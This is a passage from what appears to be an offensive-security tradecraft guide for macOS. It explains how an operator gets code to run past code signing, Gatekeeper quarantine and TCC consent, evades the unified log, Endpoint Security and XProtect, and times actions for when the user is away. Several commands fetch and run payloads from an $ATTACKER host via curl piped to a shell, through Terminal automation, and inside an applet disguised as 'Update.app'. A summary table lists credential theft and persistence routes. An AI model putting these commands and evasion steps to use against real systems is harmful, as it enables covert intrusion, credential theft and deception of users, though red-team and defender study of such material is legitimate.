**6. Cloud CLI credentials.** Plain files. Immediate reach into AWS, Azure, GCP and Kubernetes.

**7. The management platform.** Slower, louder to a diligent administrator, and by far the highest impact. Root on every Mac, plus bootstrap tokens, plus FileVault recovery keys.

**8. `~/Library/CloudStorage`.** A locally mounted, writable view of the organisation's OneDrive, SharePoint, Box or Google Drive content. Often the actual objective, reachable with nothing but file access.

**9. The Mac as an on-path position.** A corporate Mac usually sits on the internal network with a VPN or ZTNA client, is a legitimate mDNS participant, and has a full BSD networking stack. It is a good pivot host precisely because its traffic is expected. Cross-reference the pivoting material in the Lateral Movement section; the macOS-specific notes are that packet filtering is `pf` rather than `iptables` or `nftables`, and that `pfctl` requires root:

```bash
sudo pfctl -s rules 2>/dev/null
sudo pfctl -s nat 2>/dev/null
sysctl net.inet.ip.forwarding                  # 0 by default
sudo sysctl -w net.inet.ip.forwarding=1
# SSH dynamic forwarding works identically to Linux and needs no privilege.
ssh -N -D 1080 $USER@$TARGET
```

## Getting Code to Run

The general principle, and it is the opposite of Windows: **on macOS the constraint is usually consent and signing, not detection.** Nobody is going to sandbox-detonate your Mach-O in a cloud sandbox and mark the hash bad within minutes the way they will with a Windows PE. What will happen is that the kernel refuses to load an unsigned binary, or Gatekeeper refuses a quarantined one, or the user is asked a question they might answer wrongly. Solve for signing and quarantine first and you will find the detection problem substantially easier than on Windows.

### The signing floor: architecture matters

**On Apple silicon every Mach-O must carry at least an ad-hoc signature or the kernel refuses to execute it.** This is AMFI enforcement at exec time, entirely separate from and prior to Gatekeeper. A binary with the signature stripped is killed with SIGKILL:

```bash
cc payload.c -o payload            # clang on arm64 ad-hoc signs at link time
codesign -dv --verbose=4 payload
# CodeDirectory flags=0x20002(adhoc,linker-signed)  Signature=adhoc

codesign --remove-signature payload
./payload; echo $?
# 137        <- 128 + SIGKILL. It never ran.
```

On Intel, unsigned binaries run fine. So the rule is: on Apple silicon, always sign, even if only ad-hoc. It costs one command and it is the difference between working and a silent kill.

```bash
codesign -f -s - ./payload                     # ad-hoc
codesign -f -s - --deep ./Payload.app          # DEPRECATED for signing since macOS 13
codesign -f -s - -o runtime ./payload          # with hardened runtime
codesign -f -s "Developer ID Application: X (TEAMID)" -o runtime --timestamp ./payload
codesign --entitlements ./ents.plist -f -s - ./payload
```

Note that `--deep` is deprecated for signing as of macOS 13 and Apple's own man page warns it is almost never what you want; sign nested content individually, inside out.

Ad-hoc signing satisfies AMFI. It does **not** satisfy Gatekeeper: `spctl -a -t exec` on an ad-hoc-signed binary reports `rejected, source=no usable signature`. But Gatekeeper only assesses quarantined items, so if the file is not quarantined that rejection never happens.

### Quarantine, and the routes that avoid it

**Correction to a very widespread belief: Gatekeeper does fire on direct `execve` of a quarantined Mach-O.** The claim that Gatekeeper only applies through Finder and LaunchServices is stale. A quarantined, ad-hoc-signed native binary run as `./payload` from a shell blocks inside `dyld` at `_dyld_start`, before `main`, waiting on a synchronous assessment call to `syspolicyd`. That hole was closed in Catalina and is still closed. Do not plan around it.

**Scripts are exempt, and that is the important asymmetry.** A quarantined shell script runs immediately, whether invoked as `bash script.sh` or as `./script.sh` via its shebang. No hang, no prompt, no assessment. The reason is mechanical: the kernel gates the mapping of executable code pages, and a text file being read as interpreter input never maps as code. So:

| Artefact | Quarantined | Result |
| --- | --- | --- |
| Mach-O, direct `execve` | Yes | Blocked, assessed by `syspolicyd` |
| Mach-O, direct `execve` | No | Runs, subject only to the AMFI signature floor |
| Shell or other interpreted script | Yes | **Runs.** No assessment |
| `.command` file, double-clicked or via `open` | Yes | Blocked. LaunchServices routes it through assessment as if it were an app |
| `.app` bundle, launched | Yes | Blocked, full Gatekeeper and notarisation check |
| `.pkg`, double-clicked | Yes | Blocked unless notarised |
| `.pkg` via `sudo installer -pkg` | Either | Runs. No Gatekeeper involvement at all |
| dylib loaded by a process | Either | Subject to library validation, not Gatekeeper |

The delivery routes that do not set quarantine, verified where noted:

| Route | Sets quarantine? |
| --- | --- |
| `curl`, including `curl --xattr` | **No.** Verified. `--xattr` writes only `xdg.origin.url` |
| `wget`, `scp`, `sftp`, `rsync` | No |
| `git clone` | No |
| SMB, NFS or AFP mount | No |
| `pip`, `npm`, `brew`, `gem`, `cargo` install | No |
| Compiling on the target | No |
| Writing the file from an already-running process | No, unless that process sets `LSFileQuarantineEnabled` |
| Browser download | Yes |
| Mail, Messages, Teams, Slack attachment | Yes |
| AirDrop | Yes, on everything, including plain text |
| Archive Utility extraction from a quarantined archive | Yes |
| `unzip`, `tar`, `ditto` from a quarantined archive | **Yes.** This changed. See the correction earlier in this section |

The clean pattern is therefore: get on the box by some other means, then fetch and build or fetch and run with tools that never quarantine.

```bash
# Nothing here is ever quarantined or assessed.
curl -fsSL http://$ATTACKER/s | /bin/sh
curl -fsSL http://$ATTACKER/p -o /tmp/.p && chmod +x /tmp/.p && codesign -f -s - /tmp/.p && /tmp/.p
```

If you do end up with a quarantined artefact, strip the attribute before execution, remembering that a bundle needs the recursive form and that the SIP-protected `com.apple.macl` and `com.apple.provenance` attributes will remain:

```bash
xattr -l ./Payload.app
xattr -r -d com.apple.quarantine ./Payload.app
xattr -c ./payload
# Verify
spctl -a -vvv -t exec ./Payload.app
```

Removing quarantine requires write access to the file, which you have if you put it there.

### Interpreters that actually ship

Verified inventory on current macOS. The important negative results are as significant as the positives.

| Interpreter | Present | Notes |
| --- | --- | --- |
| `/bin/sh`, `/bin/zsh` | Yes | `zsh` 5.9, the default shell since Catalina |
| `/bin/bash` | Yes | Frozen at 3.2.57 for licence reasons. No associative arrays, no `mapfile` |
| `/usr/bin/perl` | Yes | 5.34.1. Deprecated by Apple since Catalina, still shipping |
| `/usr/bin/ruby` | Yes | 2.6.10. Deprecated since Catalina, still shipping |
| `/usr/bin/tclsh` | Yes | 8.5 |
| `/usr/bin/expect` | Yes | |
| `/usr/bin/awk`, `sed`, `osascript` | Yes | |
| `/usr/bin/python` (Python 2) | **No** | Removed in macOS 12.3, stated explicitly in Apple's release notes |
| `/usr/bin/python3` | **Stub** | On a machine without Xcode or the Command Line Tools this is a shim that pops a dialogue offering to install developer tools. There is no bundled, ready-to-run system Python 3 |
| `/usr/bin/swift` | **Stub** | Same shim behaviour. Real only with the CLT installed |
| `/usr/bin/php` | **No** | Removed. Version not established <!-- VERIFY --> |
| `/usr/bin/lua` | **No** | Never shipped |

**Do not write a Python payload for macOS.** This is the single most common mistake in macOS tradecraft and it comes from Python 2 having shipped by default until 2022. On a clean corporate Mac with no developer tools, invoking `python3` shows the user a dialogue asking to install Xcode, which is about as loud as an outcome gets. Test whether it is real before relying on it:

```bash
# Is python3 a real interpreter or the developer-tools shim?
xcode-select -p 2>/dev/null && echo "CLT present" || echo "CLT absent: python3/swift are stubs"
/usr/bin/python3 -c 'print(1)' 2>&1 | head -2
ls -l /Library/Developer/CommandLineTools 2>/dev/null
# Real Pythons a developer will have:
ls -l /opt/homebrew/bin/python3 /usr/local/bin/python3 /opt/homebrew/bin/uv 2>/dev/null
command -v python3 pyenv conda uv 2>/dev/null
```

`zsh` and `bash` are the safe universal choices. `perl` and `ruby` are still present and are excellent for anything needing more than shell, with the caveat that both are formally deprecated and could disappear. On a developer machine there is almost always a real Python from Homebrew, `pyenv`, `uv` or Conda, and using theirs rather than the system one is both more reliable and less anomalous.

Note also that `zsh` on macOS defaults to `NO_EXTENDED_HISTORY`, so `~/.zsh_history` has no timestamps unless configured otherwise, and that `bash` 3.2's age means Linux `bash` payloads using modern syntax will fail.

### AppleScript, JXA and the automation surface

AppleScript is a genuinely powerful and genuinely macOS-specific capability, and it is entangled with TCC at every step.

```bash
osascript -e 'display dialog "text"'
osascript -e 'do shell script "whoami"'
osascript -l JavaScript -e 'ObjC.import("Foundation"); $.NSProcessInfo.processInfo.hostName.js'
osascript /path/to/script.scpt
osascript -e 'tell application "Finder" to get name of every disk'
```

The three things to understand:

**`do shell script ... with administrator privileges`** still works and still prompts. It blocks on a standard authentication dialogue naming the requesting application, with a password field and Touch ID. It does not silently escalate. As a privilege escalation this is a social engineering technique with an approval dialogue attached, and it is the loudest thing in this section.

```applescript
do shell script "id" with administrator privileges
do shell script "id" user name "admin" password "$PASS" with administrator privileges
```

The second form supplies credentials non-interactively and does not prompt, which makes it useful when you already have an administrator password and want to escalate from a GUI context. Note that the password appears in the process arguments of `osascript`.

**Automating another application requires `kTCCServiceAppleEvents`**, scoped per source-application and target-application pair. The first attempt produces the "X wants to control Y" dialogue, synchronously, at the point the Apple Event is sent. Verified: `tell application "System Events" to get name of every process` from a non-granted, non-interactive context blocks waiting on that consent prompt. It does not fail, it hangs, which will look like a broken payload if you are not expecting it. Always run automation with a timeout.

```bash
# Never issue an Apple Event without a timeout, or a consent prompt will hang you.
timeout 5 osascript -e 'tell application "System Events" to get name of every process' \
  || echo "blocked on TCC consent"
```

What Automation buys you, once granted, is substantial and is the reason it is worth pursuing: `System Events` can enumerate and drive the UI of every application, read window titles and contents, click buttons and type text. `Finder` can read and move files. `Terminal` can be told to run commands, which is a TCC laundering technique in itself if Terminal holds grants your process does not. Mail, Notes, Messages and Calendar can be driven to read and export their contents, which is a route to TCC-protected data through the application that legitimately holds the permission rather than through the filesystem.

```applescript
tell application "System Events" to get name of every process whose visible is true
tell application "System Events" to get value of attribute "AXTitle" of every window of process "Safari"
tell application "Notes" to get the body of every note
tell application "Mail" to get the content of every message of inbox
tell application "Terminal" to do script "curl -fsSL http://$ATTACKER/s | sh"
```

The `Terminal` line is worth dwelling on. If your process has Automation rights for Terminal, and Terminal has Full Disk Access (which on a developer's machine it very often does), then you have just laundered your way into Full Disk Access through two grants neither of which is Full Disk Access. That composition is the essence of TCC exploitation.

**Accessibility (`kTCCServiceAccessibility`) is a separate and stronger grant** than Automation and is required for synthetic event injection and for the general UI-scripting path. `kTCCServicePostEvent` covers `CGEvent` synthesis specifically. Both can be pre-granted silently by MDM through PPPC and cannot be granted by any local action other than the user clicking through the dialogue.

**Applets are Mach-O bundles, not scripts.** `osacompile -o thing.app -e '...'` produces a real application bundle whose `Contents/MacOS/applet` is a universal Mach-O, and it is automatically ad-hoc signed. That means an AppleScript applet is subject to exactly the same AMFI and Gatekeeper rules as any compiled application, and is not the "it's only a script" delivery vector people assume.

```bash
osacompile -o /tmp/Update.app -e 'do shell script "curl -fsSL http://$ATTACKER/s | sh"'
codesign -dv /tmp/Update.app 2>&1 | grep -E 'flags|Signature'
# flags=0x2(adhoc)   Signature=adhoc
```

`.scpt` files, by contrast, are data and are run by `osascript`, so they follow the script rules rather than the Mach-O rules.

### Other execution routes

**In-memory execution is genuinely constrained on macOS**, and this is a real difference from Windows worth stating clearly. There is no supported `dlopen`-from-memory. `NSCreateObjectFileImageFromMemory` is described in Apple's own current documentation as long-deprecated and fundamentally insecure, and using it under the hardened runtime requires `com.apple.security.cs.allow-unsigned-executable-memory`. The supported route to executing generated code is `mmap` with `MAP_JIT` plus `com.apple.security.cs.allow-jit`, which is a JIT primitive rather than a loader. So the practical position is: your payload will touch disk, or it will run inside an interpreter, or it will run inside a process you injected into that already holds a JIT entitlement. Plan for the file on disk and make the file boring.

```bash
# Executing from a writable path is not itself restricted. SIP protects system
# paths from writes; it does not stop execution from /tmp or a home directory.
cp ./payload /private/tmp/.cache && chmod +x /private/tmp/.cache
codesign -f -s - /private/tmp/.cache && /private/tmp/.cache
```

**`open` and URL schemes.**

```bash
open -a "Google Chrome" "http://$ATTACKER/"
open -b com.apple.Terminal
open -u "customscheme://payload"               # trigger a registered URL handler
open -n -a /path/to/App.app --args --flag      # new instance with arguments
open -W ./thing                                # wait for exit
# Enumerate registered URL schemes and handlers:
/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/\
LaunchServices.framework/Versions/A/Support/lsregister -dump | grep -A3 -i 'bindings:.*:'
```

Remember that `open` routes through LaunchServices, which means Gatekeeper assessment applies where it would for a double-click. `open` is a delivery mechanism for social engineering and a poor choice for quiet execution.

**Rosetta 2 and x86_64 payloads on Apple silicon.** Rosetta is installed on demand, not by default, and the installation is a visible prompt and a logged event. Detecting whether it is available is not the same as detecting whether you are running under it:

```bash
sysctl -n sysctl.proc_translated        # 1 only if the CURRENT process is translated
ls -la /usr/libexec/rosetta 2>/dev/null # oahd, translate_tool etc: Rosetta is installed
ls /Library/Apple/usr/libexec/oah 2>/dev/null
arch -x86_64 /usr/bin/true 2>/dev/null && echo "x86_64 executes" || echo "no Rosetta"
```

`sysctl.proc_translated` is self-referential and always returns 0 from a native arm64 process, so it is useless as an "is Rosetta installed" check. Use the path check or the `arch` test. And the simple answer is to build universal or `arm64`, so the question never arises.

**Launchd and XPC as execution mechanisms** are covered under Persistence on macOS above. Note only that a launchd-loaded binary faces the same AMFI signing floor as anything else, and that XPC services inside a bundle are ordinary Mach-Os with no exemption.

## Detection and Opsec

### The unified log

The unified log is the primary telemetry source on macOS and it has three properties that matter to an operator, all of them unusual.

**It is readable by anyone.** An unprivileged local user can run `log show` and `log stream` and see system-wide entries about every user's processes. There is no equivalent of the Windows Security event log's access control. This cuts both ways: it is a superb enumeration source, as the TCC technique earlier in this section demonstrates, and it means your own activity is visible to anyone who looks, without them needing privilege.

**Most of it is transient.** Live tracing lives in ring buffers; the persisted store is `.tracev3` files under `/var/db/diagnostics`, decoded against format catalogues in `/var/db/uuidtext`. Retention is governed by size quotas rather than a fixed window. On a real machine, `log stats` reported a 1.7 GB archive covering 22 days and 32 million events. Do not assume anything survives long, and do not assume nothing does.

**Private data is redacted by default.** `os_log` treats dynamic string arguments as private unless the developer annotated them `%{public}s`, which is why you see `<private>` where you want a path. `--private-data` reveals it and, for some subsystems, requires a signed logging configuration profile rather than just the flag. <!-- VERIFY: per-subsystem gating on macOS 26 -->

```bash
log stats
log show --last 1h --predicate '<pred>' --style compact --info --debug
log stream --predicate '<pred>' --style compact
log collect --output /tmp/a.logarchive --last 24h    # then: log show --archive /tmp/a.logarchive
log config --status --subsystem com.apple.TCC        # root required
```

The predicates that matter:

| Predicate | What it shows |
| --- | --- |
| `subsystem == "com.apple.TCC"` | Every permission decision, with the requesting and responsible processes and the verdict. The best enumeration source on the platform |
| `subsystem == "com.apple.syspolicy.exec"` | `syspolicyd`'s per-execution Gatekeeper, quarantine and notarisation verdicts |
| `process == "launchd"` | Job bootstrap, load, unload and spawn, with labels |
| `subsystem == "com.apple.securityd"` | Code signing, trust evaluation and keychain access decisions |
| `process CONTAINS "XProtect"` | XProtect and XProtect Remediator scan results |
| `process == "sudo"` | `sudo` invocations |
| `process == "mdmclient"` or `process == "ManagedClient"` | MDM check-ins and commands received |
| `senderImagePath CONTAINS "..."` | Narrow to a specific binary |

```bash
# Watch your own footprint in real time. Run this while testing a payload.
log stream --style compact --predicate \
  'subsystem == "com.apple.syspolicy.exec" OR subsystem == "com.apple.TCC" \
   OR process == "launchd" OR process CONTAINS "XProtect"'
```

**Tampering.** There is no supported command to clear the log. `/var/db/diagnostics` is on the data volume, not the sealed system volume, so root can delete `.tracev3` files, which destroys that time range. It is also loud in every way that matters: it leaves an obvious continuity gap, any Endpoint Security client sees the `NOTIFY_UNLINK` events, `logd` is respawned by launchd if killed, and `/var/db/diagnostics` is `root:admin 750` so the deletion itself needs root. Log destruction on macOS is possible and is not stealthy. Prefer not generating the entries.

### Endpoint Security Framework

Everything serious on macOS is built on Endpoint Security, so understanding what it sees is understanding what your adversary sees.

A client needs the `com.apple.developer.endpoint-security.client` entitlement, which Apple grants on request and you cannot self-assign; it must be packaged as a **system extension**; it needs Full Disk Access (`kTCCServiceEndpointSecurityClient` and `kTCCServiceSystemPolicyAllFiles`); and it needs user approval or MDM pre-approval via the `SystemExtensions` payload.

```bash
systemextensionsctl list
```

The event families, with the ones that matter to you called out:

| Event | Significance |
| --- | --- |
| `NOTIFY_EXEC`, `NOTIFY_FORK`, `NOTIFY_EXIT` | Complete process lineage with full argument vectors. This is the macOS equivalent of Sysmon event 1 and it is comprehensive, unlike the unified log |
| `NOTIFY_OPEN`, `CREATE`, `WRITE`, `RENAME`, `UNLINK`, `CLOSE`, `LINK` | Full filesystem activity |
| `NOTIFY_MMAP` | Library loads. Catches dylib injection |
| `NOTIFY_SETEXTATTR` | Extended attribute writes. Catches quarantine stripping |
| `NOTIFY_GET_TASK`, `GET_TASK_READ`, `GET_TASK_INSPECT` | Task port acquisition attempts. Catches process injection setup |
| `NOTIFY_REMOTE_THREAD_CREATE` | Thread injection into another process |
| `NOTIFY_SIGNAL`, `PROC_SUSPEND_RESUME` | Interference with other processes |
| `NOTIFY_BTM_LAUNCH_ITEM_ADD` / `_REMOVE` | **macOS 13 and later.** Authoritative real-time persistence installation notification, with the instigating and responsible processes and the item path. The single best detection primitive Apple ships |
| `NOTIFY_TCC_MODIFY` | **macOS 15.4 and later.** Real-time TCC grant and revoke notification, with the service, the instigator, the responsible process, and the reason. Only fires on actual changes, not on every check, and apps with baked-in entitlements produce no event |
| `NOTIFY_PROFILE_ADD` / `_REMOVE` | Configuration profile installation and removal |
| `NOTIFY_AUTHENTICATION`, `LOGIN_LOGIN`, `LOGIN_LOGOUT`, `SU`, `SUDO`, `OPENSSH_LOGIN` | Authentication events across the mechanisms |
| `NOTIFY_XP_MALWARE_DETECTED` / `_REMEDIATED` | XProtect verdicts, surfaced to third-party clients |
| `NOTIFY_GATEKEEPER_USER_OVERRIDE` | A user clicked through a Gatekeeper block. Directly catches the social engineering path |
| `NOTIFY_LOCKSCREEN` / `UNLOCKSCREEN` | Session lock state |
| `AUTH_*` variants | Synchronous, blocking, and can deny the operation |

<!-- VERIFY: exact spelling and introduction version of individual ES_EVENT_TYPE_* constants -->

**What Endpoint Security does not see.** Network traffic content, which is why vendors pair it with Network Extension. Memory contents, as distinct from task port acquisition attempts. Operations that never cross an instrumented syscall boundary. And critically, anything happening before the system extension finishes loading at boot, which is a real early-boot blind window and is one reason launch daemons remain attractive despite BTM.

`AUTH_*` events are synchronous and the kernel imposes a timeout after which it **fails open** and allows the operation. Stalling or flooding an Endpoint Security client to force timeouts is a publicly discussed design tradeoff. <!-- VERIFY: current timeout value and behaviour -->

**Unloading it.** System extensions require user approval to activate and, on current macOS, cannot be cleanly unloaded by root simply deleting the bundle or killing the process; proper deactivation goes through `OSSystemExtensionRequest` from the vendor's own application. Apple has tightened this progressively. Assume you cannot silently remove an EDR agent, and that attempting to will itself be the loudest event of your engagement. <!-- VERIFY: current systemextensionsctl uninstall behaviour on macOS 26 -->

### XProtect and Apple's own protections

| Component | Location | What it does |
| --- | --- | --- |
| XProtect signatures | `/Library/Apple/System/Library/CoreServices/XProtect.bundle/Contents/Resources/` containing `XProtect.yara`, `XPScripts.yr`, `gk.db`, `XProtect.plist`, `AppProtectionPolicy.plist`, `LegacyEntitlementAllowlist.plist` | YARA-based signature scanning at first launch and on demand. Updated daily, out of band from OS updates |
| XProtect Remediator | `/Library/Apple/System/Library/CoreServices/XProtect.app/Contents/MacOS/XProtectRemediator*` | A periodic scanner with per-family modules (`XProtectRemediatorAdload`, `XProtectRemediatorKeySteal`, `XProtectRemediatorPirrit`, `XProtectRemediatorGenieo`, `XProtectRemediatorMRTv3` and about two dozen others). Not real-time. Logs to the unified log |
| Behavioural component | Data under `/var/protected/xprotect/`, root-protected | Apple's platform security documentation confirms a behavioural analysis engine exists. The exact binary name and introduction version are not something I will assert <!-- VERIFY: naming and version --> |
| `xprotect` CLI | `/usr/bin/xprotect` | Real on current macOS. `update`, `logs`, `version`, `check`, `status` |
| MRT | `/Library/Apple/System/Library/CoreServices/MRT.app` | Still present on disk, functionally superseded by XProtect Remediator |

```bash
xprotect status
# XProtect launch scans: enabled
# XProtect background scans: enabled
xprotect version
xprotect logs
ls /Library/Apple/System/Library/CoreServices/XProtect.app/Contents/MacOS/
log show --last 24h --predicate 'process CONTAINS "XProtect"' --style compact | tail -30
```

The presence of `XProtect.yara` matters practically: XProtect is YARA-based, so it is string and pattern matching against known families, and generic loader techniques with no published family signature pass it. The `XProtectRemediator` module names tell you exactly which families Apple has invested in, which is a useful negative signal about what will not be caught. Notarisation ticket and Developer ID certificate revocation is Apple's other lever, and it is the one that kills a campaign wholesale rather than a sample.

### The artefacts your actions leave

| Artefact | Location | Needs to read | Needs to clear |
| --- | --- | --- | --- |
| `com.apple.quarantine` xattr | On the file | File access | Write access to the file |
| Quarantine event database | `~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2` (SQLite: URL, timestamp, downloading app) | User, possibly FDA | User |
| `com.apple.macl` | On the file | File access | **Cannot be removed.** SIP-protected |
| `com.apple.provenance` | On the file, from macOS 13. Tracked in the ExecPolicy database | File access | **Cannot be removed.** SIP-protected |
| `kMDItemWhereFroms`, `kMDItemDownloadedDate` | Spotlight index, via `mdls` | User | Only by rebuilding the index (`mdutil -E /`), which needs admin |
| FSEvents | `/.fseventsd/` per volume, gzipped change logs of create, delete, rename with paths | root | Disabling needs a `no_log` file in the directory and root. Survives unified log deletion |
| Shell history | `~/.zsh_history` | User | User. No timestamps by default |
| Launch services database | `lsregister -dump` | User | Rebuilding the database |
| Unified log | `/var/db/diagnostics` | Anyone, via `log` | Deleting `.tracev3` as root. Loud |
| Installer log | `/var/log/install.log`, plaintext, world-readable | Anyone | root, and obviously |
| Package receipts | `/var/db/receipts/`, `pkgutil --pkgs` | User | root |
| Saved window state | `~/Library/Saved Application State/<bundleid>.savedState/` | User | User. Can leak terminal scrollback |
| Recent items and servers | `~/Library/Application Support/com.apple.sharedfilelist/` | **TCC protected** | Granted process |
| KnowledgeC and Biome | `~/Library/Application Support/Knowledge/knowledgeC.db`, `~/Library/Biome`, `/var/db/biome` | **TCC protected**, per calling process | Granted process |
| Crash and diagnostic reports | `~/Library/Logs/DiagnosticReports/`, `/Library/Logs/DiagnosticReports/` | User or root | User or root. A crashed payload leaves a full report with a stack trace |
| Endpoint Security telemetry | Off-box, in the EDR console | Not yours | Not yours |

Two of these deserve emphasis because they defeat the obvious cleanup. **`com.apple.provenance` and `com.apple.macl` cannot be stripped**, so `xattr -d com.apple.quarantine` does not erase the record of what wrote a file. **FSEvents is independent of the unified log**, so deleting `.tracev3` files leaves the filesystem change record intact. And the `DiagnosticReports` directory is worth checking after every payload test, because a crash there is a complete, symbolised description of your tooling handed to the defender.

```bash
ls -lat ~/Library/Logs/DiagnosticReports/ /Library/Logs/DiagnosticReports/ 2>/dev/null | head
sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2 \
  "SELECT * FROM LSQuarantineEvent ORDER BY LSQuarantineTimeStamp DESC LIMIT 10;" 2>/dev/null
mdls -name kMDItemWhereFroms ./file
```

### TCC prompts as the thing most likely to expose you

This is the macOS-specific opsec concern and it deserves its own treatment because it has no analogue on any other platform.

**A permission dialogue appearing on a user's screen is an immediate, unmistakable tell.** It is not a log entry a defender might read next week. It is a modal box in front of a human being right now, naming the thing that wants the permission, in language the user has been trained to be suspicious of, at a moment they were doing something else. Users report these. Help desks escalate them. On a security-aware estate, "Terminal wants to access data from other apps" appearing unprompted is an incident within the hour.

The dialogues you can trigger, roughly ordered by how alarming they are:

| Prompt | Triggered by |
| --- | --- |
| "X wants access to control Y" | Any Apple Event to another application without an existing grant |
| "X would like to access data from other apps" | Touching a TCC-protected path |
| "X wants to use the camera / microphone" | Media capture. Also lights the hardware indicator, which is a second tell |
| "X is requesting to bypass the system private window picker and directly access your screen" | Screen capture. Recent macOS also shows recurring reminders for continued screen recording |
| "X wants to make changes" with a password field | `do shell script with administrator privileges`, or any authorisation right requiring authentication |
| "X wants to install a helper tool" | `SMJobBless` or `SMAppService` daemon registration |
| BTM banner: an item was added that runs in the background | Any launch agent, launch daemon or login item installation |
| Gatekeeper block dialogue | Executing a quarantined, unnotarised artefact |
| Developer tools installation dialogue | Invoking `/usr/bin/python3` or `swift` on a machine without the CLT |

The operational rules that follow:

1. **Never speculatively touch a protected resource to see what happens.** Test whether you have the grant with a read that fails cheaply, and read the error string: `Operation not permitted` on a file you own is TCC and means *do not retry through a prompting API*.
2. **Always use a timeout on anything that might prompt.** A consent dialogue blocks the calling process indefinitely. Your payload will appear to hang, and the dialogue will sit on the user's screen for as long as you leave it there, which is the worst possible outcome.
3. **Prefer inheriting a grant over requesting one.** Enumerate grants from the unified log, find a process that already has what you need, and get inside it.
4. **Prefer data that is not protected.** Slack, Teams, Signal, source trees, dotfiles and cloud CLI caches need no permission at all. Messages, Mail and Safari need one. Take the free thing.
5. **Check whether anyone is at the keyboard before doing anything that might prompt.** If the screen is locked and the user is away, a dialogue may sit unseen for hours, or may be the first thing they see on return.

```bash
# Nanoseconds since the last human input. Note: no -a, which would switch ioreg
# to plist output and break the grep.
ioreg -c IOHIDSystem -r -d 1 | awk -F' = ' '/HIDIdleTime/{printf "%.0f s idle\n", $2/1000000000; exit}'

who                              # who is logged in, and on which terminal
stat -f%Su /dev/console          # the console user, or root if nobody is logged in
pmset -g assertions | head -20   # is the display asleep, is something preventing sleep
ioreg -n Root -d1 | grep -i AppleClamshellState    # is the lid shut
/usr/bin/log show --last 5m --predicate 'eventMessage CONTAINS "screenIsLocked"' \
  --style compact 2>/dev/null | tail -5
```

`HIDIdleTime` from `IOHIDSystem` is the most reliable "is somebody there" signal available without any grant or privilege: it is nanoseconds since the last keyboard or pointer event. A value corresponding to minutes means the seat is empty and a dialogue will not be seen immediately. A value of seconds means the user is actively working and will see anything you pop instantly. Check it before every action that can prompt.

### Management platform visibility

What the organisation can see about the Mac, which bounds how long you have.

**Bare Apple MDM** sees inventory snapshots at check-in: `DeviceInformation` (OS version, FileVault, firewall, SIP and Gatekeeper state, storage, MDM enrolment), `InstalledApplicationList`, `ProfileList`, `CertificateList`, `SecurityInfo`. It is pull-based, wakes via APNs, and is not a live feed. It cannot list running processes and has no arbitrary shell.

**Jamf's `recon`** goes far further: a full installed-application scan, local user accounts, printers, AD binding, certificates, local administrators, FileVault escrow status, and Extension Attributes, which are administrator-authored scripts running as root at inventory collection whose output becomes searchable inventory data. That means a Jamf-managed fleet can report essentially anything local, including process lists and EDR presence, if someone wrote the script. Frequency is configured per deployment, commonly daily or bound to a check-in trigger.

```bash
# What the platform actually collects, from the endpoint's side.
sudo jamf recon -verbose 2>/dev/null | head -60
sudo jamf policy -verbose 2>/dev/null | head -60
log show --last 24h --predicate 'process == "mdmclient" OR process == "ManagedClient"' \
  --style compact | tail -40
grep -i 'mdm\|InstallEnterpriseApplication\|InstallApplication' /var/log/install.log | tail -20
```

The general principle: **agent-based management sees far more than the MDM protocol does**, and the agent is also the thing that gives you fleet-wide execution. The same component is both your best route in and the estate's best chance of noticing. On an Intune-only, agentless-ish deployment, endpoint visibility is genuinely thin and the real telemetry comes from Defender's Endpoint Security extension instead.

## Summary Table

| Technique class | What it requires | What it yields |
| --- | --- | --- |
| Situational awareness (`profiles status`, `systemextensionsctl`, `app-sso platform -s`) | Unprivileged shell | Management state, MDM vendor and URL, EDR inventory, cloud identity posture, device certificate |
| TCC grant enumeration from the unified log | Unprivileged shell | Complete effective permission map, including which apps hold Full Disk Access |
| Entitlement and signing-flag sweep of `/Applications` | Unprivileged shell | Ranked list of injectable applications and TCC escalation targets |
| Local account hash extraction (`ShadowHashData`) | root | Offline-crackable hash which, once cracked, unlocks the login keychain |
| `admin` group to root | The account password, or a NOPASSWD `sudoers.d` rule | root |
| `sudoers.d` misconfiguration | Unprivileged shell to find it | root without a password |
| Writable launch item component | Write access to a plist, program, or `WatchPaths` target | Code execution as that job's user, usually root |
| Privileged helper XPC validation bug | Local code execution, a vulnerable helper | root, quietly, via a supported IPC channel |
| Installer package with a `postinstall` script | root or a `sudo` credential | root code execution, unsigned, no Gatekeeper. Logged in `install.log` |
| Dylib hijack into an app with `disable-library-validation` | Write access to a search path | Code execution inside the app's identity, inheriting its TCC grants and keychain ACLs |
| `DYLD_INSERT_LIBRARIES` | Target lacks the hardened runtime, or holds `allow-dyld-environment-variables` plus `disable-library-validation` | Same, more directly |
| Authorisation database write | root or admin | Prompt suppression for future privileged operations. Not an escalation on its own |
| TCC grant inheritance from a granted parent | A shell inside a granted process (Terminal, IDE) | Full Disk Access and everything it protects, with no prompt |
| Automation chaining through a granted app | An existing `kTCCServiceAppleEvents` grant | Protected data, via the app that legitimately holds the permission |
| PPPC push via MDM | Control of the management console | Silent Full Disk Access, Screen Recording and Accessibility, fleet-wide |
| Cloud CLI caches, dotfiles, source trees, `.env`, tfstate | File read as the user | AWS, Azure, GCP, Kubernetes, registry and CI credentials. No prompts, no privilege |
| Chromium credentials and cookies | Profile files plus the Safe Storage keychain item | Every saved password and session cookie. App-Bound Encryption is Windows-only, so unhardened |
| Login keychain, targeted | Unlocked session with a trusting ACL, or the user's password | Named application secrets |
| Login keychain, offline | File read plus offline password cracking | The whole legacy keychain, eventually |
| Data protection keychain and Safari passwords | The user's password plus a live session, or Full Disk Access | iCloud Keychain and Safari. No public offline tooling |
| System keychain | root, via `/var/db/SystemKey` | Wi-Fi PSKs, 802.1X machine identity, AD computer account password |
| SSH keys and agent socket | File read, or the same session | Direct lateral movement into the production estate |
| Kerberos ticket export | Same audit session and uid, or root plus `use-uid-matching` | A portable ccache for the Windows estate |
| Platform SSO device identity | Unprivileged read for the posture, and it is not extractable if Secure Enclave backed | Compliant-device status, silent tokens, Conditional Access satisfaction from that host |
| SCEP or ACME machine identity | root, and `HardwareBound = 0` with `Attest = 0` | An exportable 802.1X and VPN device credential usable from anywhere |
| Management platform compromise | Console or API credentials with deployment privilege | root on every enrolled Mac, bootstrap tokens, FileVault recovery keys |
| Launch agent or daemon persistence | User for `~/Library`, root for `/Library` | Reliable persistence, at the cost of a BTM event and a user notification |
| Shell startup file persistence | User, or root for `/etc/zshenv` | Quiet persistence outside BTM, triggered on shell use |
